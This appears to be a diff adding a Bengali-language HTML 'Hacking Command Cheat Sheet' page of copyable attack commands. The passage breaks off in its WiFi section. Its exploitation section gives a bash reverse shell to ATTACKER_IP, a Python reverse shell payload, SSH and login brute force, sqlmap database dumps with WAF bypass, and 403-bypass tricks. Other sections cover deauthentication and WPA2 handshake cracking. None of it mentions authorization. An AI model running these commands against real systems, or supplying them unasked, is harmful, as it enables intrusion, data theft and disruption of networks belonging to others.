@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hacking Command Cheat Sheet</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #050b14;
+  --bg2:    #080f1c;
+  --bg3:    #0c1628;
+  --border: #1a2a40;
+  --text:   #c8d8e8;
+  --muted:  #4a6080;
+  --green:  #00ff88;
+  --cyan:   #00d4ff;
+  --yellow: #ffd700;
+  --red:    #ff4444;
+  --purple: #bf7fff;
+  --orange: #ff8c00;
+  --mono:   'JetBrains Mono', monospace;
+  --body:   'Hind Siliguri', sans-serif;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  font-size: 14px;
+  min-height: 100vh;
+}
+
+/* SCANLINE EFFECT */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 2px,
+    rgba(0,255,136,0.015) 2px, rgba(0,255,136,0.015) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* HEADER */
+header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 24px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.logo {
+  font-family: var(--mono);
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--green);
+  letter-spacing: 2px;
+  white-space: nowrap;
+}
+.logo .bracket { color: var(--muted); }
+.logo .blink {
+  display: inline-block;
+  width: 8px; height: 14px;
+  background: var(--green);
+  margin-left: 4px;
+  animation: blink 1s step-end infinite;
+  vertical-align: middle;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+.search-wrap {
+  flex: 1;
+  position: relative;
+  max-width: 500px;
+}
+.search-wrap .icon {
+  position: absolute;
+  left: 12px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--muted);
+  font-size: 14px;
+}
+#searchInput {
+  width: 100%;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 9px 12px 9px 36px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 13px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+#searchInput:focus { border-color: var(--green); box-shadow: 0 0 0 2px rgba(0,255,136,0.1); }
+#searchInput::placeholder { color: var(--muted); }
+
+.count-badge {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  white-space: nowrap;
+}
+.count-badge span { color: var(--green); font-weight: 700; }
+
+/* LAYOUT */
+.layout {
+  display: flex;
+  height: calc(100vh - 57px);
+}
+
+/* SIDEBAR */
+.sidebar {
+  width: 200px;
+  flex-shrink: 0;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  padding: 12px 0;
+}
+.sidebar::-webkit-scrollbar { width: 4px; }
+.sidebar::-webkit-scrollbar-track { background: transparent; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.sidebar-title {
+  font-family: var(--mono);
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--muted);
+  padding: 6px 16px;
+  text-transform: uppercase;
+}
+
+.cat-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  width: 100%;
+  padding: 9px 16px;
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--muted);
+  font-family: var(--mono);
+  font-size: 12px;
+  text-align: left;
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+}
+.cat-btn:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+.cat-btn.active {
+  color: var(--green);
+  background: rgba(0,255,136,0.06);
+  border-left-color: var(--green);
+}
+.cat-btn .cat-icon { font-size: 14px; }
+.cat-count {
+  margin-left: auto;
+  font-size: 10px;
+  background: var(--bg3);
+  padding: 1px 6px;
+  border-radius: 10px;
+  color: var(--muted);
+}
+.cat-btn.active .cat-count { background: rgba(0,255,136,0.15); color: var(--green); }
+
+/* MAIN */
+.main {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px 24px;
+}
+.main::-webkit-scrollbar { width: 6px; }
+.main::-webkit-scrollbar-track { background: transparent; }
+.main::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* SECTION */
+.section { margin-bottom: 28px; }
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 12px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+.section-icon { font-size: 18px; }
+.section-title {
+  font-family: var(--mono);
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--green);
+  letter-spacing: 1px;
+}
+.section-desc {
+  font-size: 12px;
+  color: var(--muted);
+  margin-left: auto;
+  font-family: var(--mono);
+}
+
+/* COMMAND GRID */
+.cmd-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+  gap: 10px;
+}
+
+/* COMMAND CARD */
+.cmd-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  overflow: hidden;
+  transition: border-color 0.2s, transform 0.15s;
+}
+.cmd-card:hover {
+  border-color: rgba(0,255,136,0.3);
+  transform: translateY(-1px);
+}
+.cmd-card.hidden { display: none; }
+
+.cmd-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 12px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+}
+.cmd-dots { display: flex; gap: 5px; }
+.cmd-dots span {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+}
+.cmd-dots span:nth-child(1) { background: #ff5f57; }
+.cmd-dots span:nth-child(2) { background: #febc2e; }
+.cmd-dots span:nth-child(3) { background: #28c840; }
+.cmd-label {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  flex: 1;
+}
+.cmd-tag {
+  font-family: var(--mono);
+  font-size: 10px;
+  padding: 2px 7px;
+  border-radius: 4px;
+  font-weight: 600;
+}
+
+.cmd-body { padding: 10px 12px; }
+.cmd-desc {
+  font-size: 12.5px;
+  color: var(--muted);
+  margin-bottom: 8px;
+  line-height: 1.5;
+}
+
+.cmd-code {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 8px 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.8;
+  position: relative;
+  cursor: pointer;
+  transition: background 0.15s;
+}
+.cmd-code:hover { background: #07111e; }
+.cmd-code:hover .copy-hint { opacity: 1; }
+
+.copy-hint {
+  position: absolute;
+  right: 8px; top: 50%;
+  transform: translateY(-50%);
+  font-size: 10px;
+  color: var(--muted);
+  opacity: 0;
+  transition: opacity 0.2s;
+  background: var(--bg2);
+  padding: 2px 6px;
+  border-radius: 3px;
+}
+
+.cmd-code.copied { border-color: var(--green); background: rgba(0,255,136,0.05); }
+.cmd-code.copied .copy-hint { opacity: 1; color: var(--green); }
+
+/* Syntax colors */
+.s-cmd  { color: var(--cyan); }
+.s-flag { color: var(--yellow); }
+.s-val  { color: var(--green); }
+.s-com  { color: var(--muted); font-style: italic; }
+.s-var  { color: var(--orange); }
+.s-str  { color: #a6e3a1; }
+.s-red  { color: var(--red); }
+.s-pur  { color: var(--purple); }
+.s-prompt { color: var(--muted); }
+
+/* EMPTY STATE */
+.empty {
+  text-align: center;
+  padding: 80px 20px;
+  color: var(--muted);
+  font-family: var(--mono);
+}
+.empty .empty-icon { font-size: 48px; margin-bottom: 16px; }
+.empty .empty-text { font-size: 14px; }
+
+/* TOAST */
+.toast {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  background: var(--green);
+  color: var(--bg);
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 700;
+  padding: 10px 18px;
+  border-radius: 6px;
+  opacity: 0;
+  transform: translateY(10px);
+  transition: all 0.25s;
+  z-index: 9000;
+  pointer-events: none;
+}
+.toast.show { opacity: 1; transform: translateY(0); }
+
+/* NO RESULT */
+.no-result { display: none; text-align: center; padding: 60px; color: var(--muted); font-family: var(--mono); font-size: 13px; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <span class="bracket">[</span>HACK<span class="bracket">]</span>
+    <span style="color:var(--muted);">~$</span>
+    <span class="blink"></span>
+  </div>
+  <div class="search-wrap">
+    <span class="icon">🔍</span>
+    <input type="text" id="searchInput" placeholder="command খোঁজো... (nmap, sqlmap, burp...)" autocomplete="off">
+  </div>
+  <div class="count-badge"><span id="visibleCount">0</span> commands</div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="sidebar-title">Categories</div>
+    <button class="cat-btn active" data-cat="all" onclick="filterCat(this)">
+      <span class="cat-icon">⚡</span> All
+      <span class="cat-count" id="cnt-all">0</span>
+    </button>
+    <button class="cat-btn" data-cat="recon" onclick="filterCat(this)">
+      <span class="cat-icon">🔭</span> Recon
+      <span class="cat-count" id="cnt-recon">0</span>
+    </button>
+    <button class="cat-btn" data-cat="scan" onclick="filterCat(this)">
+      <span class="cat-icon">🗺️</span> Scanning
+      <span class="cat-count" id="cnt-scan">0</span>
+    </button>
+    <button class="cat-btn" data-cat="web" onclick="filterCat(this)">
+      <span class="cat-icon">🌐</span> Web Enum
+      <span class="cat-count" id="cnt-web">0</span>
+    </button>
+    <button class="cat-btn" data-cat="exploit" onclick="filterCat(this)">
+      <span class="cat-icon">💥</span> Exploit
+      <span class="cat-count" id="cnt-exploit">0</span>
+    </button>
+    <button class="cat-btn" data-cat="wifi" onclick="filterCat(this)">
+      <span class="cat-icon">📶</span> WiFi
+      <span class="cat-count" id="cnt-wifi">0</span>
+    </button>
+    <button class="cat-btn" data-cat="post" onclick="filterCat(this)">
+      <span class="cat-icon">🏴</span> Post-Exploit
+      <span class="cat-count" id="cnt-post">0</span>
+    </button>
+    <button class="cat-btn" data-cat="network" onclick="filterCat(this)">
+      <span class="cat-icon">📡</span> Network
+      <span class="cat-count" id="cnt-network">0</span>
+    </button>
+    <button class="cat-btn" data-cat="crack" onclick="filterCat(this)">
+      <span class="cat-icon">🔨</span> Cracking
+      <span class="cat-count" id="cnt-crack">0</span>
+    </button>
+    <button class="cat-btn" data-cat="misc" onclick="filterCat(this)">
+      <span class="cat-icon">🔧</span> Misc
+      <span class="cat-count" id="cnt-misc">0</span>
+    </button>
+  </nav>
+
+  <main class="main" id="mainContent">
+    <!-- Injected by JS -->
+  </main>
+</div>
+
+<div class="toast" id="toast">✓ Copied!</div>
+
+<script>
+const COMMANDS = [
+  // ═══════ RECON ═══════
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'whois', tag: 'WHOIS', tagColor: '#0ea5e9',
+    desc: 'Domain registrar, owner info, nameserver দেখো',
+    code: '<span class="s-cmd">whois</span> <span class="s-var">target.com</span>',
+    raw: 'whois target.com'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'dig - all records', tag: 'DNS', tagColor: '#0ea5e9',
+    desc: 'সব DNS record একসাথে দেখো (A, MX, NS, TXT)',
+    code: '<span class="s-cmd">dig</span> <span class="s-var">target.com</span> <span class="s-flag">ANY</span> <span class="s-flag">+noall +answer</span>',
+    raw: 'dig target.com ANY +noall +answer'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'subfinder', tag: 'SUBDOMAIN', tagColor: '#8b5cf6',
+    desc: 'Passive subdomain enumeration — দ্রুত ও নিরাপদ',
+    code: '<span class="s-cmd">subfinder</span> <span class="s-flag">-d</span> <span class="s-var">target.com</span> <span class="s-flag">-o</span> <span class="s-str">subs.txt</span> <span class="s-flag">-v</span>',
+    raw: 'subfinder -d target.com -o subs.txt -v'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'amass enum', tag: 'SUBDOMAIN', tagColor: '#8b5cf6',
+    desc: 'Deep subdomain enumeration — comprehensive',
+    code: '<span class="s-cmd">amass</span> enum <span class="s-flag">-d</span> <span class="s-var">target.com</span> <span class="s-flag">-o</span> <span class="s-str">amass.txt</span>',
+    raw: 'amass enum -d target.com -o amass.txt'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'httpx - live hosts', tag: 'PROBE', tagColor: '#10b981',
+    desc: 'কোন subdomain alive — title ও tech সহ',
+    code: '<span class="s-cmd">httpx</span> <span class="s-flag">-l</span> <span class="s-str">subs.txt</span> <span class="s-flag">-o</span> <span class="s-str">live.txt</span> <span class="s-flag">-title -status-code -tech-detect</span>',
+    raw: 'httpx -l subs.txt -o live.txt -title -status-code -tech-detect'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'whatweb', tag: 'FINGERPRINT', tagColor: '#f59e0b',
+    desc: 'Technology stack detect (CMS, server, version)',
+    code: '<span class="s-cmd">whatweb</span> <span class="s-flag">-a 3</span> <span class="s-var">target.com</span>',
+    raw: 'whatweb -a 3 target.com'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'theHarvester', tag: 'OSINT', tagColor: '#ec4899',
+    desc: 'Email, employee, subdomain Google/Bing/LinkedIn থেকে',
+    code: '<span class="s-cmd">theHarvester</span> <span class="s-flag">-d</span> <span class="s-var">target.com</span> <span class="s-flag">-b</span> google,bing,linkedin <span class="s-flag">-l</span> 500',
+    raw: 'theHarvester -d target.com -b google,bing,linkedin -l 500'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'crt.sh - SSL certs', tag: 'CERT', tagColor: '#0ea5e9',
+    desc: 'Certificate transparency থেকে subdomain বের করো',
+    code: '<span class="s-cmd">curl</span> <span class="s-flag">-s</span> <span class="s-str">"https://crt.sh/?q=%.target.com&output=json"</span> | jq <span class="s-flag">-r</span> <span class="s-str">\'.[].name_value\'</span> | sort <span class="s-flag">-u</span>',
+    raw: 'curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r \'.[].name_value\' | sort -u'
+  },
+  {
+    cat: 'recon', section: 'Reconnaissance', sIcon: '🔭',
+    label: 'git-dumper', tag: 'GIT', tagColor: '#ef4444',
+    desc: '.git directory exposed হলে source code dump করো',
+    code: '<span class="s-cmd">git-dumper</span> <span class="s-str">https://target.com/.git</span> ./git_dump',
+    raw: 'git-dumper https://target.com/.git ./git_dump'
+  },
+
+  // ═══════ SCANNING ═══════
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nmap - quick', tag: 'NMAP', tagColor: '#6366f1',
+    desc: 'Top 1000 ports — service version + default scripts',
+    code: '<span class="s-cmd">nmap</span> <span class="s-flag">-sV -sC -T3 --open</span> <span class="s-var">target.com</span>',
+    raw: 'nmap -sV -sC -T3 --open target.com'
+  },
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nmap - full ports', tag: 'NMAP', tagColor: '#6366f1',
+    desc: 'সব 65535 port scan — complete coverage',
+    code: '<span class="s-cmd">nmap</span> <span class="s-flag">-p-</span> <span class="s-flag">-T3 --open</span> <span class="s-flag">-oN</span> <span class="s-str">full.txt</span> <span class="s-var">target.com</span>',
+    raw: 'nmap -p- -T3 --open -oN full.txt target.com'
+  },
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nmap - vuln scripts', tag: 'NMAP', tagColor: '#6366f1',
+    desc: 'Built-in vulnerability scripts চালাও',
+    code: '<span class="s-cmd">nmap</span> <span class="s-flag">--script vuln</span> <span class="s-flag">-T3 --open</span> <span class="s-var">target.com</span>',
+    raw: 'nmap --script vuln -T3 --open target.com'
+  },
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nmap - http scripts', tag: 'NMAP', tagColor: '#6366f1',
+    desc: 'HTTP vulnerability এবং enumeration scripts',
+    code: '<span class="s-cmd">nmap</span> <span class="s-flag">-p 80,443</span> <span class="s-flag">--script</span> <span class="s-str">"http-vuln*,http-enum,http-headers"</span> <span class="s-var">target.com</span>',
+    raw: 'nmap -p 80,443 --script "http-vuln*,http-enum,http-headers" target.com'
+  },
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nmap - ftp anonymous', tag: 'NMAP', tagColor: '#6366f1',
+    desc: 'FTP anonymous login allowed কিনা চেক করো',
+    code: '<span class="s-cmd">nmap</span> <span class="s-flag">-p 21</span> <span class="s-flag">--script ftp-anon,ftp-bounce</span> <span class="s-var">target.com</span>',
+    raw: 'nmap -p 21 --script ftp-anon,ftp-bounce target.com'
+  },
+  {
+    cat: 'scan', section: 'Port & Service Scanning', sIcon: '🗺️',
+    label: 'nikto', tag: 'WEB SCAN', tagColor: '#10b981',
+    desc: 'Web server misconfiguration quick scan',
+    code: '<span class="s-cmd">nikto</span> <span class="s-flag">-h</span> <span class="s-str">https://target.com</span> <span class="s-flag">-o</span> <span class="s-str">nikto.txt</span>',
+    raw: 'nikto -h https://target.com -o nikto.txt'
+  },
+
+  // ═══════ WEB ENUM ═══════
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'ffuf - directory', tag: 'FFUF', tagColor: '#f59e0b',
+    desc: 'Directory brute force — common wordlist',
+    code: '<span class="s-cmd">ffuf</span> <span class="s-flag">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="s-flag">-u</span> <span class="s-str">https://target.com/FUZZ</span> <span class="s-flag">-mc</span> 200,301,302,403',
+    raw: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ -mc 200,301,302,403'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'ffuf - extensions', tag: 'FFUF', tagColor: '#f59e0b',
+    desc: '.php .bak .env .sql .log extension সহ file খোঁজো',
+    code: '<span class="s-cmd">ffuf</span> <span class="s-flag">-w</span> wordlist.txt <span class="s-flag">-u</span> <span class="s-str">https://target.com/FUZZ</span> <span class="s-flag">-e</span> .php,.bak,.env,.sql,.log,.zip <span class="s-flag">-fc</span> 404',
+    raw: 'ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.bak,.env,.sql,.log,.zip -fc 404'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'ffuf - subdomain', tag: 'FFUF', tagColor: '#f59e0b',
+    desc: 'Subdomain brute force with ffuf',
+    code: '<span class="s-cmd">ffuf</span> <span class="s-flag">-w</span> subdomains.txt <span class="s-flag">-u</span> <span class="s-str">https://FUZZ.target.com</span> <span class="s-flag">-mc</span> 200,301,302',
+    raw: 'ffuf -w subdomains.txt -u https://FUZZ.target.com -mc 200,301,302'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'gobuster dir', tag: 'GOBUSTER', tagColor: '#8b5cf6',
+    desc: 'Directory brute force alternative to ffuf',
+    code: '<span class="s-cmd">gobuster</span> dir <span class="s-flag">-u</span> <span class="s-str">https://target.com</span> <span class="s-flag">-w</span> common.txt <span class="s-flag">-x</span> php,html,txt <span class="s-flag">-t</span> 50',
+    raw: 'gobuster dir -u https://target.com -w common.txt -x php,html,txt -t 50'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'arjun - params', tag: 'PARAMS', tagColor: '#ec4899',
+    desc: 'Hidden GET/POST parameters discover করো',
+    code: '<span class="s-cmd">arjun</span> <span class="s-flag">-u</span> <span class="s-str">https://target.com/search</span> <span class="s-flag">-oT</span> <span class="s-str">params.txt</span>',
+    raw: 'arjun -u https://target.com/search -oT params.txt'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'wpscan', tag: 'WORDPRESS', tagColor: '#ef4444',
+    desc: 'WordPress plugin, theme, user enumerate করো',
+    code: '<span class="s-cmd">wpscan</span> <span class="s-flag">--url</span> <span class="s-str">https://target.com</span> <span class="s-flag">--enumerate</span> p,t,u <span class="s-flag">--api-token</span> <span class="s-var">TOKEN</span>',
+    raw: 'wpscan --url https://target.com --enumerate p,t,u --api-token TOKEN'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: '403 bypass - URL', tag: 'BYPASS', tagColor: '#ef4444',
+    desc: '403 Forbidden page bypass — URL tricks',
+    code: '<span class="s-cmd">curl</span> https://target.com<span class="s-red">/./admin/</span>\n<span class="s-cmd">curl</span> <span class="s-flag">-H</span> <span class="s-str">"X-Original-URL: /admin"</span> https://target.com/\n<span class="s-cmd">curl</span> <span class="s-flag">-H</span> <span class="s-str">"X-Forwarded-For: 127.0.0.1"</span> https://target.com/admin',
+    raw: 'curl https://target.com/./admin/\ncurl -H "X-Original-URL: /admin" https://target.com/\ncurl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin'
+  },
+  {
+    cat: 'web', section: 'Web Enumeration', sIcon: '🌐',
+    label: 'curl - headers', tag: 'HEADERS', tagColor: '#0ea5e9',
+    desc: 'HTTP response headers দেখো — security headers check',
+    code: '<span class="s-cmd">curl</span> <span class="s-flag">-sI</span> https://target.com | grep <span class="s-flag">-i</span> <span class="s-str">"server\\|x-powered\\|x-frame\\|set-cookie"</span>',
+    raw: 'curl -sI https://target.com | grep -i "server\\|x-powered\\|x-frame\\|set-cookie"'
+  },
+
+  // ═══════ EXPLOIT ═══════
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'sqlmap - basic', tag: 'SQLI', tagColor: '#ef4444',
+    desc: 'Basic SQL injection test করো',
+    code: '<span class="s-cmd">sqlmap</span> <span class="s-flag">-u</span> <span class="s-str">"https://target.com/item?id=1"</span> <span class="s-flag">--batch</span>',
+    raw: 'sqlmap -u "https://target.com/item?id=1" --batch'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'sqlmap - dump db', tag: 'SQLI', tagColor: '#ef4444',
+    desc: 'Database dump — tables ও data বের করো',
+    code: '<span class="s-cmd">sqlmap</span> <span class="s-flag">-u</span> <span class="s-str">"https://target.com/item?id=1"</span> <span class="s-flag">-D</span> <span class="s-var">dbname</span> <span class="s-flag">-T</span> <span class="s-var">users</span> <span class="s-flag">--dump --batch</span>',
+    raw: 'sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump --batch'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'sqlmap - from request', tag: 'SQLI', tagColor: '#ef4444',
+    desc: 'Burp Suite-এর saved request file থেকে sqlmap',
+    code: '<span class="s-cmd">sqlmap</span> <span class="s-flag">-r</span> <span class="s-str">request.txt</span> <span class="s-flag">--batch --dbs</span>',
+    raw: 'sqlmap -r request.txt --batch --dbs'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'sqlmap - waf bypass', tag: 'SQLI', tagColor: '#ef4444',
+    desc: 'WAF bypass করে SQLi চালাও',
+    code: '<span class="s-cmd">sqlmap</span> <span class="s-flag">-u</span> <span class="s-str">"https://target.com/item?id=1"</span> <span class="s-flag">--tamper</span>=space2comment,between <span class="s-flag">--batch</span>',
+    raw: 'sqlmap -u "https://target.com/item?id=1" --tamper=space2comment,between --batch'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'dalfox - XSS', tag: 'XSS', tagColor: '#f59e0b',
+    desc: 'Fast XSS vulnerability scanner',
+    code: '<span class="s-cmd">dalfox</span> url <span class="s-str">"https://target.com/search?q=FUZZ"</span>',
+    raw: 'dalfox url "https://target.com/search?q=FUZZ"'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'hydra - http login', tag: 'BRUTE', tagColor: '#8b5cf6',
+    desc: 'HTTP POST login form brute force',
+    code: '<span class="s-cmd">hydra</span> <span class="s-flag">-l</span> admin <span class="s-flag">-P</span> rockyou.txt <span class="s-var">target.com</span> http-post-form <span class="s-str">"/login:user=^USER^&pass=^PASS^:Invalid"</span>',
+    raw: 'hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'hydra - ssh', tag: 'BRUTE', tagColor: '#8b5cf6',
+    desc: 'SSH brute force attack',
+    code: '<span class="s-cmd">hydra</span> <span class="s-flag">-l</span> root <span class="s-flag">-P</span> rockyou.txt <span class="s-flag">-t</span> 4 ssh://<span class="s-var">target.com</span>',
+    raw: 'hydra -l root -P rockyou.txt -t 4 ssh://target.com'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'reverse shell - bash', tag: 'SHELL', tagColor: '#ef4444',
+    desc: 'Bash reverse shell — listener আগে চালাও',
+    code: 'bash <span class="s-flag">-i</span> >&amp; /dev/tcp/<span class="s-var">ATTACKER_IP</span>/<span class="s-red">4444</span> 0>&amp;1',
+    raw: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'nc listener', tag: 'SHELL', tagColor: '#ef4444',
+    desc: 'Netcat reverse shell listener চালাও',
+    code: '<span class="s-cmd">nc</span> <span class="s-flag">-lvnp</span> <span class="s-red">4444</span>\n<span class="s-com"># rlwrap nc -lvnp 4444  ← better shell</span>',
+    raw: 'nc -lvnp 4444'
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'python reverse shell', tag: 'SHELL', tagColor: '#ef4444',
+    desc: 'Python3 reverse shell payload',
+    code: '<span class="s-cmd">python3</span> <span class="s-flag">-c</span> <span class="s-str">\'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];import pty;pty.spawn("bash")\'</span>',
+    raw: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];import pty;pty.spawn("bash")\''
+  },
+  {
+    cat: 'exploit', section: 'Exploitation', sIcon: '💥',
+    label: 'shell upgrade', tag: 'SHELL', tagColor: '#10b981',
+    desc: 'Dumb shell → interactive TTY upgrade',
+    code: '<span class="s-cmd">python3</span> <span class="s-flag">-c</span> <span class="s-str">\'import pty;pty.spawn("/bin/bash")\'</span>\n<span class="s-com"># Ctrl+Z</span>\n<span class="s-cmd">stty</span> raw <span class="s-flag">-echo</span>; fg\nexport TERM=xterm',
+    raw: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm'
+  },
+
+  // ═══════ WIFI ═══════
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'airmon-ng start', tag: 'AIRCRACK', tagColor: '#10b981',
+    desc: 'WiFi adapter → Monitor mode',
+    code: '<span class="s-cmd">sudo</span> airmon-ng check kill\n<span class="s-cmd">sudo</span> airmon-ng start <span class="s-var">wlan0</span>',
+    raw: 'sudo airmon-ng check kill\nsudo airmon-ng start wlan0'
+  },
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'airodump-ng scan', tag: 'AIRCRACK', tagColor: '#10b981',
+    desc: 'কাছের সব WiFi network scan করো',
+    code: '<span class="s-cmd">sudo</span> airodump-ng <span class="s-var">wlan0mon</span>',
+    raw: 'sudo airodump-ng wlan0mon'
+  },
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'airodump - capture', tag: 'AIRCRACK', tagColor: '#10b981',
+    desc: 'Target AP-র handshake capture করো',
+    code: '<span class="s-cmd">sudo</span> airodump-ng <span class="s-flag">-c</span> <span class="s-var">6</span> <span class="s-flag">--bssid</span> <span class="s-var">AA:BB:CC:DD:EE:FF</span> <span class="s-flag">-w</span> <span class="s-str">capture</span> <span class="s-var">wlan0mon</span>',
+    raw: 'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'
+  },
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'aireplay - deauth', tag: 'AIRCRACK', tagColor: '#ef4444',
+    desc: 'Client disconnect করো → reconnect → handshake',
+    code: '<span class="s-cmd">sudo</span> aireplay-ng <span class="s-flag">--deauth</span> 10 <span class="s-flag">-a</span> <span class="s-var">AP_MAC</span> <span class="s-flag">-c</span> <span class="s-var">CLIENT_MAC</span> <span class="s-var">wlan0mon</span>',
+    raw: 'sudo aireplay-ng --deauth 10 -a AP_MAC -c CLIENT_MAC wlan0mon'
+  },
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'aircrack-ng crack', tag: 'AIRCRACK', tagColor: '#f59e0b',
+    desc: 'WPA2 handshake dictionary attack করো',
+    code: '<span class="s-cmd">sudo</span> aircrack-ng <span class="s-flag">-w</span> rockyou.txt <span class="s-flag">-b</span> <span class="s-var">AP_MAC</span> capture*.cap',
+    raw: 'sudo aircrack-ng -w rockyou.txt -b AP_MAC capture*.cap'
+  },
+  {
+    cat: 'wifi', section: 'WiFi Hacking', sIcon: '📶',
+    label: 'hashcat - WPA2', tag: 'HASHCAT', tagColor: '#f59e0b',
+    desc: 'GPU দিয়ে WPA2 crack — aircrack-ng থেকে দ্রুত',
